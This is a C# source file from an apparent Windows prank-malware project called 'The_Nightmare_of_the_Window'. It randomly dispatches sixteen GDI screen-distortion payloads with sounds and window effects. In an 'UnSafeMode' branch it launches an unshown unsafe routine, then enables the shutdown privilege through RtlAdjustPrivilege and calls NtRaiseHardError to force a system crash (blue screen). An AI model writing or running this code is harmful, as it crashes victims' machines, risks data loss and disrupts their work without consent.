using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static The_Nightmare_of_the_Window.payloads;
using static The_Nightmare_of_the_Window.function;
using static The_Nightmare_of_the_Window.api;
using static The_Nightmare_of_the_Window.Sounds;

namespace The_Nightmare_of_the_Window
{
    internal class execute
    {
        public static int many = 16;//当前payloads的数量，方便进行随机运算
        public static List<int> payloads_list = new List<int>();//剩余的payloads
        public static int payload = 0;
        public static void Run()
        {
            for (int i = 1;i <= many; i++)
            {
                payloads_list.Add(i);
            }
            NewThread(DrawCursor);
            NewThread(fanshaped);
            if (Variables.RunPingPong)
            {
                NewThread(PingPong);
            }
            if ((!Variables.SafeMode) || Variables.UnSafeMode)
                NewThread(Payloads_of_window.Window_Start);
            if (Variables.UnSafeMode)
            {
                NewThread(UnSafe.Run_UnSafe);
            }
            for(int _ = 0;_ < many; _++)
            {
                payload++;
                Choose_One(); //随机选择一个payloads运行
            }
            if (Variables.UnSafeMode)
            {
                RtlAdjustPrivilege(19, true, false, out bool previousValue);
                NtRaiseHardError(0xC0000005, 0, 0, IntPtr.Zero, 6, out uint Response);
            }
        }
        public static void Choose_One()
        {
            int index = Randint(0,payloads_list.Count - 1);
            RunIt(index);
        }
        public static void PlaySounds()
        {
            switch (payload)
            {
                case 1:
                    Sound1();
                    break;
                case 2:
                    Sound2();
                    break;
                case 3:
                    Sound3();
                    break;
                case 4:
                    Sound4();
                    break;
                case 5:
                    Sound5();
                    break;
                case 6:
                    Sound6();
                    break;
                case 7:
                    Sound7();
                    break;
                case 8:
                    Sound8();
                    break;
                case 9:
                    Sound9();
                    break;
                case 10:
                    Sound10();
                    break;
                case 11:
                    Sound11();
                    break;
                case 12:
                    Sound12();
                    break;
                case 13:
                    Sound13();
                    break;
                case 14:
                    Sound14();
                    break;
                case 15:
                    Sound15();
                    break;
                case 16:
                    Sound16();
                    break;

            }
        }
        public static void RunIt(int index)
        {
            switch (payloads_list[index])
            {
                case 1:
                    NewThread(GDI1);
                    break;
                case 2:
                    NewThread(GDI2);
                    break;
                case 3:
                    NewThread(GDI3);
                    break;
                case 4:
                    NewThread(GDI4);
                    break;
                case 5:
                    NewThread(GDI5);
                    break;
                case 6:
                    NewThread(GDI6);
                    break;
                case 7:
                    NewThread(GDI7);
                    break;
                case 8:
                    NewThread(GDI8);
                    break;
                case 9:
                    NewThread(GDI9);
                    break;
                case 10:
                    NewThread(GDI10);
                    break;
                case 11:
                    NewThread(GDI11);
                    break;
                case 12:
                    NewThread(GDI12);
                    break;
                case 13:
                    NewThread(GDI13);
                    break;
                case 14:
                    NewThread(GDI14);
                    break;
                case 15:
                    NewThread(GDI15);
                    break;
                case 16:
                    NewThread(GDI16);
                    break;
            }
            payloads_list.RemoveAt(index);
            PlaySounds();
        }
    }
}
